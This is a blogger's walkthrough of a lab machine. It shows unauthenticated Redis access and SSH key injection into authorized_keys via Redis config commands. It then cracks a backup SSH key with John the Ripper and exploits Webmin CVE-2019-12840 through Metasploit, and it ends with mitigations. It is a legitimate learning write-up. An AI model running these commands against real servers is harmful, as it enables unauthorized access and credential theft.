So I've been telling myself, “Redis is a low-hanging fruit”, thanks to all of the other quick RCE GitHub repos out there; however, once I got into the machine, I looked up from this site more about Redis:

Redis Pentesting | Hackviser
Redis pentesting techniques for identifying, exploiting, enumeration, attack vectors and post-exploitation insights.hackviser.com

So as soon as I ran the command:

redis-cli -h $target
10.129.2.1:6379>
10.129.2.1:6379> info
# Server
redis_version:4.0.9

That let me know there were no passwords protecting this service. Which real world should be? So that is the first security concern.

So I wanted to try something first before others, like the SSH Key Injection:

# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Prepare key with newlines
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt

# Inject into authorized_keys
redis-cli -h target.com flushall
cat key.txt | redis-cli -h target.com -x set ssh_key
redis-cli -h target.com config set dbfilename authorized_keys
redis-cli -h target.com config set dir /root/.ssh
redis-cli -h target.com save

# Alternative paths
/home/redis/.ssh/authorized_keys
/home/ubuntu/.ssh/authorized_keys
/var/lib/redis/.ssh/authorized_keys

# Connect via SSH
ssh -i redis_key root@target.com

But made a few tweaks;

/var/lib/redis/.ssh

#user that allowed me in
ssh -i redis_key redis@$target

And that let me without making a password! So, after compromising the Redis account, I found the user Matt. However, denied access. So one tip I learn by doing is, if you can’t get sudo -l, check /opt. And found the id_rsa.bak file. So I copied it back to my pc. Then ran John the Ripper:

ssh2john hash > hash_final
john hash_final --wordlist=/usr/share/wordlists/rockyou.txt
computer2008     (hash)

I tested it a few times with SSH to see if I could use Matt’s SSH or Redis just to be safe. Then use su Matt with the password, got in, then grabbed the flag.

Matt had zero authority to run sudo. And nothing was in the SUID; however, I checked the websites and found he had access to webadmin.

Found out it was version 1.910, and found CVE-2019–12840, and checked Metasploit:

Ran it, but it was using SSL, switched to SSL, got in:

From there, easy win!

Midgating the issue, Redis should be password-protected. Second, Matt needs a stronger password than the one that was cracked. A lot of password issues from the start, and SSH keys shouldn’t be stored in /opt. After that, CVE-2019–12840:

Webmin <= 1.910 Remote Command Execution
The remote web server is affected by a remote command execution vulnerability. (Nessus Plugin ID 146488)www.tenable.com

The software needs to be updated thanks to this exploit.

This was a fun older server to work on, but it got me thinking, if you see Redis on Linux, really go for that low-hanging fruit.
